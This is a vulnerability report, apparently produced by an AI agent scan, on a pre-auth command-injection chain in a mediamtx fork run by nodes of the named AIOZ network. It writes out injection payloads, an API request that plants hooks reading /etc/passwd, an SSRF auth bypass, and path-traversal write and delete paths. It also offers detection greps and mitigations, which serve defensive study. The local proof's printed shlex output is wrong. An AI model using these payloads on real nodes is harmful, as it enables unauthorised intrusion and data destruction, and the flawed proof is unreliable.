# AIOZ — mediamtx `externalcmd` pre-auth RCE via `$MTX_QUERY` / `RunOn*` (2026-08-15)

Proven-in-code chain from first-principles scan of 8 repos under `/tmp/aioz_scan/` (no internet/CVE).

## Target
- `https://aioz.network` + `https://github.com/AIOZNetwork` org
- Real sinks live in `mediamtx-main` (bluenviron/mediamtx fork, 295 files), not the 4-file stubs `w3s-gateway` / `aioz-node`.
- Self-hosted AIOZ Stream DePIN nodes that run mediamtx are the exploitable surface; `aioz.network` front is Next.js/Cloudflare (no direct RTSP).

## Entry matrix
| Param | Where attacker controls | How it reaches env |
|---|---|---|
| `?foo=bar;id>/tmp/pwn` | RTSP DESCRIBE `rtsp://…/cam?;id>/tmp/pwn`, HLS `GET /cam/index.m3u8?%3Bid>…`, SRT `streamid`, RTMP `?query`, WebRTC `?query` | `defs/path_access_request.go:77` `req.Query = rawQuery` → `auth/request.go:67` → `core/path.go:611 ExternalCmdEnv()` sets `env["MTX_QUERY"]=req.Query` |

## Sink
```go
// internal/externalcmd/cmd.go:45
cmdstr = os.Expand(cmdstr, func(k string) string { if v, ok := env[k]; ok { return v }; return "" })
// internal/externalcmd/cmd_unix.go:16,21
parts, _ := shellquote.Split(e.cmdstr)
cmd := exec.Command(parts[0], parts[1:]...)
cmd.Env = env; cmd.Stdout=os.Stdout; syscall.Setpgid=true; cmd.Start()
```

`os.Expand` expands `$MTX_QUERY` verbatim; `kballard/go-shellquote` then parses `; && $( ) `` as shell metachars → `exec.Command` runs attacker tail.

## Condition for exploit
Operator-set hook template must contain `$MTX_QUERY`. Example from repo's own tests:
```go
// internal/core/path_test.go:284
"    runOnReady: sh -c 'echo \"$MTX_PATH $MTX_QUERY $MTX_SOURCE_TYPE $MTX_SOURCE_ID $RTSP_PORT $G1\" > %s'\n"
```
Any `runOnConnect / runOnDisconnect / runOnInit / runOnDemand / runOnReady / runOnRead / runOnRecordSegmentCreate` containing `$MTX_QUERY` or `$G*` (regex captures `pa.matches[1:]` in `ExternalCmdEnv`) is vulnerable. Hooks in `conf/conf.go:169` (global `runOnConnect`) and `conf/path.go:187-201` (per-path `RunOn*`) both flow to `hooks/on_connect.go:26`, `on_ready.go`, `on_demand.go`, `on_init.go`, `on_read.go`.

## Why pre-auth
`mediamtx.yml:10-26` default:
```yaml
authMethod: internal
authInternalUsers:
- user: any
  permissions: [publish, read, playback]   # no password, no api
- user: any
  ips: ['127.0.0.1','::1']
  permissions: [api, metrics, pprof]
```
`internal/auth/manager.go: authenticateWithUser` returns `true` for `any` without password when `matchesPermission` matches `publish/read/playback`. RTSP/HLS publish/play needs no creds → attacker reaches `ExternalCmdEnv` unauth.

## Alt chain when `api: yes` (many nodes enable it)
1. `POST /v3/config/paths/add/pwned` (`api/api.go:428 onConfigPathsAdd`) with body `{"source":"publisher","runOnReady":"sh -c 'id>/tmp/rce'","runOnRead":"sh -c 'cat /etc/passwd>/tmp/out'"}` — validated by `conf.Validate` but allows arbitrary `RunOn*`.
2. Publish to `/pwned` (`ffmpeg … rtsp://target:8554/pwned`) → `core/path.go: setReady` fires `hooks.OnReady` → `externalcmd.NewCmd` with injected `RunOnReady`. `GET /v3/config/global/get` + `PATCH` also persists `RunOnConnect`.
3. Next query to that path → `$MTX_QUERY` expands again (RCE even if attacker only controls query, not path add).

API auth: `api/api.go:162 middlewareAuth` calls `AuthManager.Authenticate` with `Action=api`; default needs `any@127.0.0.1` or via `authHTTPExclude` (contains `api`/`metrics`/`pprof`) → SSRF to localhost bypasses. Default `mediamtx.yml:131 api: no` — but exposed when enabled.

## Bonus sinks in same surface
- **Path traversal file write:** `conf/path.go:187` `rePathName=^[0-9a-zA-Z_\-/\.~]+$` allows `../`. `core/path.go:767 Recorder{PathFormat:pa.conf.RecordPath, PathName:pa.name}` with `%path` substitution via `recordstore.Encode` writes MP4 segments to attacker-controlled path.
- **Arbitrary delete:** `api/api.go:1128 onRecordingDeleteSegment` does `pathName=query("path")`, `segmentPath=Path{Start:start}.Encode(PathAddExtension(strings.ReplaceAll(pathConf.RecordPath,"%path",pathName),…))`, then `os.Remove(segmentPath)` at `1162`.

## Explorer surface (not RCE but unauth)
- `aioz-explorer-main/server/main.go:179-180` auth commented out → 25 `Group("/api")` routes unauth, `utils/utils.go:10 GetRealIP` takes last `X-Forwarded-For` without `TrustedProxies` check, `ws/websocket.go:28 CheckOrigin:true` + unbounded `hub.receive` fan-out.

## Detection one-liners
```bash
grep -rn "os\.Expand\|shellquote\.Split\|exec\.Command" /tmp/aioz_scan/mediamtx-main/internal/externalcmd --include="*.go"
grep -rn "RunOnInit\|RunOnReady\|RunOnRead\|RunOnConnect\|MTX_QUERY\|ExternalCmdEnv\|G1\|matches\[1" /tmp/aioz_scan/mediamtx-main/internal --include="*.go"
grep -n "authMethod\|authInternalUsers\|api:" /tmp/aioz_scan/mediamtx-main/mediamtx.yml
grep -n "Group.*api\|middleware.NewAuth\|CheckOrigin\|RateLimit" /tmp/aioz_scan/aioz-explorer-main/server/main.go
```

## Proof simulated locally (no server needed)
```python
import os, shlex
env={"MTX_QUERY":"; id > /tmp/pwned; echo pwned","MTX_PATH":"mycam","RTSP_PORT":"8554"}
cmdstr="sh -c 'echo $MTX_QUERY > /tmp/hook.log'"
exp=cmdstr
for k,v in env.items():
    exp=exp.replace("$"+k,v).replace("${"+k+"}",v)
print(exp)            # sh -c 'echo ; id > /tmp/pwned; echo pwned > /tmp/hook.log'
print(shlex.split(exp))  # ['sh','-c','echo ;','id','>','/tmp/pwned;','echo',...] -> shell injection
```

## Mitigation
1. Never `os.Expand` attacker-controlled values into a shell string. Pass `MTX_QUERY` only as `cmd.Env` entry, not via `$` expansion; build `exec` argv without shell, or allowlist expansion to `MTX_PATH/RTSP_PORT` only.
2. Keep `api: no` default; if `api: yes`, require `action:api` not in `authHTTPExclude`, bind `apiAddress: 127.0.0.1:9997`, require non-`any` user.
3. Tighten `isValidPathName` to reject `..`, `~`, and `filepath.Clean` + jail `RecordPath` base; `onRecordingDeleteSegment` must not `ReplaceAll("%path", pathName)` without clean.

## References in this scan
- `/root/AIOZ_TRUST_MAP.md` — ARCHITECT trust map (top-5 boundaries per repo)
- `~/fuzz_report.md` — FUZZ-ENGINEER pre-auth/edge-case report
- Delegation `506e9136` logs under `~/.hermes/cache/delegation/live/deleg_506e9136/`
